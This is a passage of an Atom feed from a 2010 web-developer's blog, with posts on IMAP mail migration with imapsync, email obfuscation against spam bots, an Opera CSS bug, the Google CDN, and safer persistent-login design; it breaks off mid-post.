&lt;p&gt;It&amp;#39;s been 4 days, and I haven&amp;#39;t heard from them yet. In the meantime, I choose
to quit this registrar and moved the domain to Gandi.&lt;/p&gt;

&lt;p&gt;What is the most strange is that when you google them you got lot of praises
about their wonderful customer service... After having tested it, I just don&amp;#39;t
buy it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Migrating mails from IMAP to IMAP (part 2/2)</title>
   <link href="http://blog.pixelastic.com/2010/06/04/migrating-mails-from-imap-to-imap-part-2-2/"/>
   <updated>2010-06-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/04/migrating-mails-from-imap-to-imap-part-2-2</id>
   <content type="html">&lt;p&gt;I&amp;#39;ll finally have to migrate mails from one IMAP server to another because of
a change in the hosting provider of one of my clients.&lt;/p&gt;

&lt;p&gt;Let me first do a quick review of my current config :&lt;/p&gt;

&lt;p&gt;I have an IMAP server on a not-so-reliable host. I need to move all the
mailboxes to a brand new Dreamhost server.&lt;/p&gt;

&lt;p&gt;The current host use horde/imp as its webmail, but Dreamhost is running under
Squirel Mail.&lt;/p&gt;

&lt;h2&gt;How to do that ?&lt;/h2&gt;

&lt;p&gt;When I first contacted Dreamhost to ask them the better way to copy the
content of my old IMAP server to their new one, they told me that IMAP to IMAP
transfer was unfortunatly not possible.&lt;/p&gt;

&lt;p&gt;After some digging I found a little linux tool called &lt;code&gt;imapsync&lt;/code&gt;that was
developped to synchronize two IMAP servers. As I only wanted to copy content
from one server to an empty one, I guess it should work.&lt;/p&gt;

&lt;p&gt;And it does.&lt;/p&gt;

&lt;h2&gt;Installing the tool&lt;/h2&gt;

&lt;p&gt;First of all, you really need to have a Linux machine. I&amp;#39;m sorry for all
Windows and Mac users out there, but this solution will only work with Linux.&lt;/p&gt;

&lt;p&gt;Obviously, you&amp;#39;ll first have to download and install it.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m a newbie linux user, and don&amp;#39;t use it at its full potential. It means that
I rely a lot on the UI, I don&amp;#39;t know most of the more basics commands.&lt;/p&gt;

&lt;p&gt;So, I don&amp;#39;t know the correct procedure to install something, I always use the
Synaptic Packager Manager UI. I just have to type &lt;code&gt;imapsync&lt;/code&gt;, check its
checkbox and start the install.&lt;/p&gt;

&lt;p&gt;I guess you, more experienced linux user, would know how to do that anyway.&lt;/p&gt;

&lt;h2&gt;Running the command&lt;/h2&gt;

&lt;p&gt;Once it&amp;#39;s installed, you&amp;#39;ll just have to run one command. But before typing
it, you have make sure that you have all the required informations.&lt;/p&gt;

&lt;p&gt;You&amp;#39;ll need the server name, login and pass of both the source and destination
account.&lt;/p&gt;

&lt;p&gt;In my case I had previously reset all the password to newly generated one on
the source server, then created the same email (with same password) on the
destination server.&lt;/p&gt;

&lt;p&gt;For the source server name, you shouldn&amp;#39;t have any problem finding it. It
usually is something like &lt;code&gt;mail.domain.co&lt;/code&gt;m.&lt;/p&gt;

&lt;p&gt;But for the destination server, that&amp;#39;s a little more tricky. As I haven&amp;#39;t yet
changed DNS, I have a Dreamhost server but no domain name pointing to it. So I
can&amp;#39;t use &lt;code&gt;mail.domain.com&lt;/code&gt; there.&lt;/p&gt;

&lt;p&gt;I had to go my Dreamhost DNS panel (clicking on DNS under the name of my
domain in Manage domain) and check for the IP address associated with the
&lt;code&gt;mail A&lt;/code&gt; entry.&lt;/p&gt;

&lt;p&gt;Once you have all this, create a file (name it &lt;code&gt;pass&lt;/code&gt;) which contain the
password of your account (or &lt;code&gt;pass1&lt;/code&gt;and &lt;code&gt;pass2&lt;/code&gt;if source and destination
password aren&amp;#39;t the same). This is done so you won&amp;#39;t type in clear text the
password of your accounts, or they could be found in the history files.&lt;/p&gt;

&lt;p&gt;Once it&amp;#39;s done, just run the following command&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;imapsync --host1 mail.domain.com --user1 contact@domain.com --passfile1 /path/to/pass1 --host2 208.97.XXX.XXX --user2 contact@domain.com --passfile2 /path/to/pass2 --noauthmd5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is not an instant process, actually in can be quite long. One of the
mailbox I had to move had more than 20.000 mails in the sent folder and about
40.000 in the received one. It took me almost 18h to complete.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Overview of the different ways of protecting your email address</title>
   <link href="http://blog.pixelastic.com/2010/06/03/overview-of-the-different-ways-of-protecting-your-email-address/"/>
   <updated>2010-06-03T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/03/overview-of-the-different-ways-of-protecting-your-email-address</id>
   <content type="html">&lt;p&gt;You surely know that displaying an email address as plain text in a website
today is a sure way to get your mailbox full of viagra, rolex and poker ads in
no time.&lt;/p&gt;

&lt;p&gt;Spammer have bots running all day long, crawling through hundred of thousands
of pages, grabbing everything that looks like something@somewhere.com.&lt;/p&gt;

&lt;h2&gt;Existing way of protecting your email address&lt;/h2&gt;

&lt;p&gt;The safest way is to not display it in the first place. Nothing beats that.
But if you really need to be contacted through email, here are some of the
possible alternative.&lt;/p&gt;

&lt;h2&gt;Using a contact form instead.&lt;/h2&gt;

&lt;p&gt;That&amp;#39;s what I&amp;#39;m doing on this site.&lt;/p&gt;

&lt;p&gt;This way I don&amp;#39;t have to display my address, I let my server script send the
email for me.&lt;/p&gt;

&lt;p&gt;Unfortunatly, it means that you have to protect your contact form against spam
now. How to do that is not the scope of this post, however.&lt;/p&gt;

&lt;h2&gt;Using an image&lt;/h2&gt;

&lt;p&gt;Instead of writing your email as plain text, you can use an image inside which
your email is written. Spam bots can&amp;#39;t read images (well, they &lt;strong&gt;could&lt;/strong&gt; but
they won&amp;#39;t bother when there is still so many clear email they can grab
without worrying about images).&lt;/p&gt;

&lt;p&gt;Unfortunatly it has two drawbacks. First, you force your reader to type your
email as they can&amp;#39;t copy/paste it. This lead to possible typos, and more
importantly will frustrate your user.&lt;/p&gt;

&lt;p&gt;Secondly, people browsing without images (yes, that does exists, either
because they have a slow connection, browsing through an old mobile phone or
using a text reader) won&amp;#39;t be able to contact you.&lt;/p&gt;

&lt;h2&gt;Spelling it aloud&lt;/h2&gt;

&lt;p&gt;One of the better way is still to appeal to the human brain and telling your
user what your email is, like &amp;quot;my name, at, my domain dot com&amp;quot; or
&amp;quot;tim@nowhere.com where you have to change nowhere to pixelastic&amp;quot;.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve even seen someone using the very long form of : &amp;quot;tee ee em at pee hi ex
ee el ah ess tee hi see dot see oh em&amp;quot;. Sure, spammer won&amp;#39;t get that, but the
truth is, not many user won&amp;#39;t either.&lt;/p&gt;

&lt;p&gt;The drawback of this method is the same as the previous one, you force your
user to type your address.&lt;/p&gt;

&lt;h2&gt;Ain&amp;#39;t there an easiest way ?&lt;/h2&gt;

&lt;p&gt;Would&amp;#39;nt it be better if we hadn&amp;#39;t to worry about that. If there was a way
that all our reader would read the email, click on it and send us a mail ?
While being protected from spam bots ?&lt;/p&gt;

&lt;p&gt;Well, there have been attempt to do that, using various server side and client
side techniques. Unfortunatly, all of them failed for at least one type of
users.&lt;/p&gt;

&lt;h2&gt;Encrypting email using unicode&lt;/h2&gt;

&lt;p&gt;One can encrypt any string in Unicode using server script language. It will
turn every character into an entity like &amp;#46;. Your browser will stil
understand it correctly, and display it as the corresponding value.&lt;/p&gt;

&lt;p&gt;We could assume that bots won&amp;#39;t understand it, but I have no data to back that
up. It would be trivial for an harvest bot to parse email using unicode, so I
won&amp;#39;t recommend it.&lt;/p&gt;

&lt;h2&gt;Using CSS to display the mail&lt;/h2&gt;

&lt;p&gt;Modern browser, with great CSS support can help in this process with the use
of generated content and the :after pseudo class.&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s look at the following code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;@pixelastic.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;tim&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;span&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:after&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You just put your username in the &lt;code&gt;span&lt;/code&gt;, and the domain name in the &lt;code&gt;rel
&lt;/code&gt;attribute and let CSS display it as one single email address.&lt;/p&gt;

&lt;p&gt;But you need a browser with a correct CSS support to do that, otherwise you
will only see the user part, which is not really useful.&lt;/p&gt;

&lt;h2&gt;Using an HTTP redirect&lt;/h2&gt;

&lt;p&gt;This one is a clever one that I haven&amp;#39;t seen used a lot. Instead of making a
link to a mailto:, you make the link go to a mail.php page that will only
contain one php statement :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;header(&amp;#39;Location: mailto:user@domain.com&amp;#39;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I&amp;#39;m not sure of the browser support of this, however. And it still won&amp;#39;t solve
the problem of displaying your email address.&lt;/p&gt;

&lt;h2&gt;Adding HTML noise&lt;/h2&gt;

&lt;p&gt;You can add HTML comments (&lt;code&gt;&amp;lt;!-- --&amp;gt;&lt;/code&gt;), or useless elements (&lt;code&gt;&amp;lt;span /&amp;gt;&lt;/code&gt;) all
around your email adress. They won&amp;#39;t get processed by your browser that will
still display it as normal, but it will most likely make the spam bot choke.&lt;/p&gt;

&lt;p&gt;Unfortunatly, you can&amp;#39;t use them in the &lt;code&gt;href=&amp;quot;mailto:&amp;quot;&lt;/code&gt; section of your link,
so it is not a perfect fit either. But still, that&amp;#39;s a good start.&lt;/p&gt;

&lt;h2&gt;Using Javascript to populate the email&lt;/h2&gt;

&lt;p&gt;The principle behind this one is that Javascript will write the email adress
for you in the code. As most spam bots won&amp;#39;t have Javascript enabled (again, I
don&amp;#39;t have source to back that up but I assume so), they won&amp;#39;t be able to see
it.&lt;/p&gt;

&lt;p&gt;Just write your email address in a Javascript file, maybe in several different
variables that you&amp;#39;ll merge to create the final one. The more obfuscated your
code is, the harder it will be for the spammer to add its logic to its bot.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;There isn&amp;#39;t one perfect solution yet. But maybe, merging several of them we
could bypass the weaknesses to create something that really handle all the
situations.&lt;/p&gt;

&lt;p&gt;I have some ideas in the back of my head actually, I&amp;#39;ll try to make something
with them and post it here.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m pretty sure starting with an obfuscated HTML source (but still correctlt
displaying), then adding an obfuscated Javascript layer to create the
&lt;code&gt;mailto:&lt;/code&gt; link is the way to go.&lt;/p&gt;

&lt;p&gt;This would mean a better user experience for users with Javascript, but that&amp;#39;s
ok, that&amp;#39;s what Javascript is for.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Opera bug : border-radius and background-color on an input</title>
   <link href="http://blog.pixelastic.com/2010/06/01/opera-bug-border-radius-and-background-color-on-an-input/"/>
   <updated>2010-06-01T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/01/opera-bug-border-radius-and-background-color-on-an-input</id>
   <content type="html">&lt;p&gt;The form inputs of this site all have a border-radius and a background-color.
Unfortunatly, the latest Opera version just don&amp;#39;t like that (9.5 works like a
charm).&lt;/p&gt;

&lt;p&gt;When you apply the following rules to an input element, Opera will discard
your background color and render it as transparent instead.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;radius&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#375a5e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;All three rules causes the bug. Remove one of them and the bug disappear.&lt;/p&gt;

&lt;h2&gt;Solution&lt;/h2&gt;

&lt;p&gt;At first I thought that I could just as well remove the border-radius rule and
I won&amp;#39;t have any more bugs. But a slightly decreased user experience for my
Opera readers.&lt;/p&gt;

&lt;p&gt;Then I&amp;#39;ll try to come up with a better solution. One can add a background-
image instead of a background-color. Odd enough, this won&amp;#39;t trigger the bug.&lt;/p&gt;

&lt;p&gt;But I wanted to avoid that, that&amp;#39;s one more useless request to the server and
it&amp;#39;s far more easier to change a color code in a css file that to edit an
image file.&lt;/p&gt;

&lt;p&gt;The solution I choose was to not set a &lt;code&gt;border:none;&lt;/code&gt; but to simulate it by
adding invisible border. That would add 1px around the input element, so we&amp;#39;ll
limit it by only adding the border on one of the sides. Adding it on the right
side seemed to be the more convenient method.&lt;/p&gt;

&lt;p&gt;So here&amp;#39;s my updated code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;radius&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;border-right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#375a5e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>New website</title>
   <link href="http://blog.pixelastic.com/2010/05/31/new-website/"/>
   <updated>2010-05-31T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/31/new-website</id>
   <content type="html">&lt;p&gt;I just uploaded the new version of the website. The old one was severely
needing a fresh new look, so here it is.&lt;/p&gt;

&lt;p&gt;As I want to showcase my skills as a web developer I didn&amp;#39;t want a website
with a too awesome design, so I decided to do it all by myself. I&amp;#39;m quite
happy with the result.&lt;/p&gt;

&lt;p&gt;The &amp;quot;Work&amp;quot; page is still in progress, images from the old site aren&amp;#39;t yet
available and I haven&amp;#39;t yet tested it with IE.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve added a comment section (a feature that was lacking from the previous
site). I plan to translate the site in French to have something fully
bilingual, but that too is a work in progress.&lt;/p&gt;

&lt;p&gt;If you ever spot a bug, just drop a comment, I&amp;#39;m hunting them right now.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Migrating mails from IMAP to IMAP (part 1/2)</title>
   <link href="http://blog.pixelastic.com/2010/05/28/migrating-mails-imap-part-1-2/"/>
   <updated>2010-05-28T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/28/migrating-mails-imap-part-1-2</id>
   <content type="html">&lt;p&gt;One of my clients wanted to change its hosting provider because of almost
constant downtime. I suggested that we move the whole site and the associated
email addresses to Dreamhost.&lt;/p&gt;

&lt;p&gt;He is heavily using its webmail, with a dozen of different accounts, all with
custom address book and drafts to reuse.&lt;/p&gt;

&lt;p&gt;I had already moved a previous site of the same client to a GMail powered
webmail and he wasn&amp;#39;t so satisfied of it because of the lack of a &amp;quot;draft&amp;quot;
feature that would allow him to reuse the same message templates.&lt;/p&gt;

&lt;p&gt;Its current webmail is powered by Imp (Horde) and the default Dreamhost
webmail is Squirel Mail.&lt;/p&gt;

&lt;p&gt;So now I&amp;#39;m faced with a challenge. Which webmail should I choose and how will
I initiate the migration ?&lt;/p&gt;

&lt;h2&gt;Contestant 1 : Horde&lt;/h2&gt;

&lt;p&gt;The easiest way would have been to reuse Horde. Horde has a nifty
export/import function. It means that I could have exported the settings on
the current host and imported them back in the new host.&lt;/p&gt;

&lt;p&gt;Unfortunatly, Horde is not pre-installed on Dreamhost. It means I would have
to install it and I don&amp;#39;t really want to do it. This is not my area of
expertise and if something goes wrong it will take me ages to fix.&lt;/p&gt;

&lt;p&gt;Additionnaly, the default php5 install on Dreamhost lacks the IMAP extension
needed and SSL connection requires an additional monthly fee.&lt;/p&gt;

&lt;p&gt;That would be the better solution for the client, but I don&amp;#39;t feel capable of
doing it.&lt;/p&gt;

&lt;h2&gt;Contestant 2 : Squirel Mail&lt;/h2&gt;

&lt;p&gt;Squirel Mail is the default webmail on Dreamhost. It means that they do handle
all the heavy stuff of configuring it and making sure it does not crash.&lt;/p&gt;

&lt;p&gt;They assure me that I can have unlimited hosting of my mails, the only limits
are a maximum of 100 SMTP sending per hour and no attached filed &amp;gt; 7Mo.&lt;/p&gt;

&lt;p&gt;Those are almost no issues at all, we can handle that. I just have to check if
the 100 sending per hour is for each mail address or for the entire account.&lt;/p&gt;

&lt;p&gt;The only problem will be that I can&amp;#39;t export/import the horde feature into
Squirel.&lt;/p&gt;

&lt;p&gt;What I could do however is synchronize the two IMAP servers, effectively
copying all the mail from the current one to the new. Unfortunatly, there is
no easy way to do that.&lt;/p&gt;

&lt;p&gt;The Dreamhost support even told me that it was impossible. I found a linux
command named imapsynch however that maybe could help, but I&amp;#39;ll need to know
the name of the dreamhost imap server and needed credentials to connect to it.
I&amp;#39;ll sort this out with them.&lt;/p&gt;

&lt;h2&gt;Contestant 3 : GMail&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve already set mails up with GMail a couple of times in the past so this
won&amp;#39;t be too hard. Could take some times, but nothing difficult about that.&lt;/p&gt;

&lt;p&gt;I may be able to copy the current mails to the GMail server, I&amp;#39;ve seen some
articles on the subject floating on the network, but I&amp;#39;ll definitly won&amp;#39;t be
able to copy drafts.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I&amp;#39;m still in contact with the Dreamhost support to choose the better option. I
don&amp;#39;t think I&amp;#39;ll install Horde, this will be too much work. I guess I&amp;#39;ll go
with the second option of migrating mails to Squirel Mail.&lt;/p&gt;

&lt;p&gt;Whatever solution I&amp;#39;ll pick, I&amp;#39;ll be sure to post the whole details here for
others to follow.&lt;/p&gt;

&lt;h2&gt;Update&lt;/h2&gt;

&lt;p&gt;&lt;del&gt;I finally won&amp;#39;t have to migrate mails, the client makes regular POP
backup of its mails so he will just do one more right before the transfer and
will start over with a brand new mail boxes. Concerning the drafts, he will
manually copy-paste them from one webmail to the other and he told me that he
wasn&amp;#39;t using the address book...&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;So it appears that I&amp;#39;ll just have to change the DNS to point to the new
webmail and create a temporary CNAME to still access the old webmail on the
old server until the migration is totally over.&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;Re-update&lt;/p&gt;

&lt;p&gt;In fact, it appears that I won&amp;#39;t be able to access both webmail at the same
time. I&amp;#39;ll have DNS issues, and the registrar panel that I have is very basic,
I won&amp;#39;t be able to fine tuned it correctly.&lt;/p&gt;

&lt;p&gt;It seems that I&amp;#39;ll have to migrate mails from one server to the other.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Pros and cons of using Google CDN for your assets</title>
   <link href="http://blog.pixelastic.com/2010/05/25/pros-cons-google-cdn-assets/"/>
   <updated>2010-05-25T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/25/pros-cons-google-cdn-assets</id>
   <content type="html">&lt;p&gt;With the recent Google Fonts breakout, much debate surfaces to know if it
really was useful to use Google CDN to deliver your assets to your users.&lt;/p&gt;

&lt;p&gt;I used to think it was a goog thing because it allowed for parallelized
download, but after reading really good articles on the subject I&amp;#39;m not so
sure.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll try to list the pros and cons of using Google CDN instead of serving your
files locally.&lt;/p&gt;

&lt;h2&gt;Pros&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Using a CDN assure you that your users will get content from the closest server around them, no matter where they are.&lt;/li&gt;
&lt;li&gt;The more websites will use Google CDN, the biggest the chance of your user already having the file in its cache&lt;/li&gt;
&lt;li&gt;Downloading from a CDN assure that you won&amp;#39;t be sending useless cookies along the request. You shouldn&amp;#39;t send cookies when fetching your static files anyway, but sometime -Google Analytics for example-, some script create domain-wide cookies that still get sent.&lt;/li&gt;
&lt;li&gt;Many niched major websites (ArmorGames.com, StackOverflow.com, etc) uses the CDN, so if a large part of your trafic is coming from one of those, using the CDN and the exact same library version will have no perfomance downsides for you.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Cons&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Using a CDN create a new connection to access the ressource on an other server instead of using the already open connection to your website. Creating a new connection is slow.&lt;/li&gt;
&lt;li&gt;Caching of the files will only be possible if the exact same version url is used. E. using &lt;code&gt;/jquery/1.4.0/&lt;/code&gt; instead of &lt;code&gt;/jquery/1.4/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;If you already are using your own CDN for your images, you should also use it for your javascript and in this case the google one is worthless because you already have all the advantages.&lt;/li&gt;
&lt;li&gt;An Internet connection is required. This may seem obvious but if you have to work on a project while on a trip, you&amp;#39;ll need a local copy of the library.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Stalemate&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Using a CDN force a DNS lookup. This lookup can be cached if the user already visited your website or another that use the same CDN however.&lt;/li&gt;
&lt;li&gt;Browsers have a limit of paralels downloads on the same host. Using a CDN allow for more parallelization. But creating dummy subdomains like &lt;code&gt;static.domain.com&lt;/code&gt; would also defeat this limitation.&lt;/li&gt;
&lt;li&gt;In the case of Javascript/CSS, packing all your files (scripts and libraries) in one big file on your server and serving it gzipped will result in a better compression that serving the library from a CDN and your scripts from your server. On the other hand, the user would have to re-download the whole package whenever you make a tiny change to your scripts, even if you didn&amp;#39;t changed the library.&lt;/li&gt;
&lt;li&gt;Downloading script usually block page execution. So reducing the number of scripts to load (by packing them in one file instead of downloading one locally and one on the CDN) will reduce the blocking time. On the other hand, merging two files will result in a longer download time (because the file is larger) while using the CDN would allow the two scripts to download in parallel.&lt;/li&gt;
&lt;li&gt;What happen if your CDN is down ? Well, when using Google that&amp;#39;s not much a risk but still. As a side effect, you should&amp;#39;nt even consider using a CDN if your application is for an intranet.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As a conclusion, all I can answer to the &amp;quot;Should I use the Google CDN for my
javascript libraries ?&amp;quot; is &amp;quot;Well... it depends...&amp;quot;.&lt;/p&gt;

&lt;p&gt;Really it depends on your configuration. Run some tests, try with a CDN or by
compressing the library into your main file. Check where your users are coming
from and the average loading time. Test various configuration until you found
the one that works the best for you.&lt;/p&gt;

&lt;p&gt;On a personal note I do use Google CDN for my websites. The cost of the DNS
lookup and connection to the Google server is really worth the parallelized
download in my case. But it may be so because I&amp;#39;m living in France and my
website is hosted in the US, so a CDN really helps.&lt;/p&gt;

&lt;h2&gt;Source links&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://docs.google.com/document/pub?id=14Xn7kkKwVxSie6xHJwWRAP5mutM7qlWcrHgWtZo63gI&lt;/li&gt;
&lt;li&gt;http://zoompf.com/blog/2010/01/should-you-use-javascript-library-cdns&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Doing persistent login the right way</title>
   <link href="http://blog.pixelastic.com/2010/05/25/doing-persistent-login-the-right-way/"/>
   <updated>2010-05-25T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/25/doing-persistent-login-the-right-way</id>
   <content type="html">&lt;p&gt;When I was a young web developer, I had to code an admin panel, with username
and login. I also added the well-known &amp;quot;Remember me&amp;quot; checkbox.&lt;/p&gt;

&lt;p&gt;I wasn&amp;#39;t really educated to the security concerns of developing such a
feature. In fact, I was even storing the passwords as plain text in the
database.&lt;/p&gt;

&lt;p&gt;And to allow the user to auto-login, I stored the user and password, in plain
text, in a cookie and requested a login with those credentials whenever its
session expired.&lt;/p&gt;

&lt;h2&gt;That&amp;#39;s insane !&lt;/h2&gt;

&lt;p&gt;Yes it was, but I remember thinking &amp;quot;Well, nobody can even have access to the
database so there&amp;#39;s no risk&amp;quot; and &amp;quot;I can store the password in the cookie, it
is only accessible by the user, and he surely already know its password.
There&amp;#39;s no harm in that&amp;quot;&lt;/p&gt;

&lt;p&gt;Well, XSS and CSRF weren&amp;#39;t so common back in those days.&lt;/p&gt;

&lt;p&gt;Since then I&amp;#39;ve learned a lot. There&amp;#39;s just no way I&amp;#39;ll ever store a plain
text or uncrypted password in a database again. Hashing and salting is the way
to go.&lt;/p&gt;

&lt;p&gt;But I kept implementing the persistent login feature following the same
pattern : saving the username and hashed password in the cookie.&lt;/p&gt;

&lt;p&gt;I was thinking &amp;quot;The password is not stored as plain text but as a hash,
there&amp;#39;s no way an attacker would even be able to guess the password from
that&amp;quot;.&lt;/p&gt;

&lt;h2&gt;That&amp;#39;s better, but still...&lt;/h2&gt;

&lt;p&gt;I haven&amp;#39;t thought that the cookie was like an open sesame to my app. One would
just have to steal the file and place it in its browser cookie list and he
would have exactly the same access to the website, without having to know my
password.&lt;/p&gt;

&lt;p&gt;In the meantime I was also implementing OpenId authentication and as it is
passwordless (at least from the website point of view), I couldn&amp;#39;t save the
username and password in the cookie.&lt;/p&gt;

&lt;p&gt;Clearly, something was broken in my persistent login implementation.&lt;/p&gt;

&lt;h2&gt;Here come the tokens&lt;/h2&gt;

&lt;p&gt;After some research, I finally get it the right way.&lt;/p&gt;

&lt;p&gt;Whenever a user authenticate, be it from a classical user/pass login form or
using OpenId, I keep it loggued using session vars. When the session var
expires, the user is loggued out. If he had checked the &amp;quot;Remember me&amp;quot;
